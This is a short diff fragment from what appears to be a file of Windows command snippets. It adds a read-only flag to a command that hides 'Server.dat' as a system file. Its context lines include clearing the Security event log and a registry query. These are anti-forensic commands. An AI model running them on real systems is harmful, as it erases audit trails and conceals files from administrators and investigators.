@@ -324,7 +324,7 @@ wevtutil cl security
 
 reg query HKLM\SOFTWARE\Classes\.tudf /s
 
-attrib +h +s "Server.dat"
+attrib +h +s +r "Server.dat"
 ```
 ```
 function DOWNLOAD() {
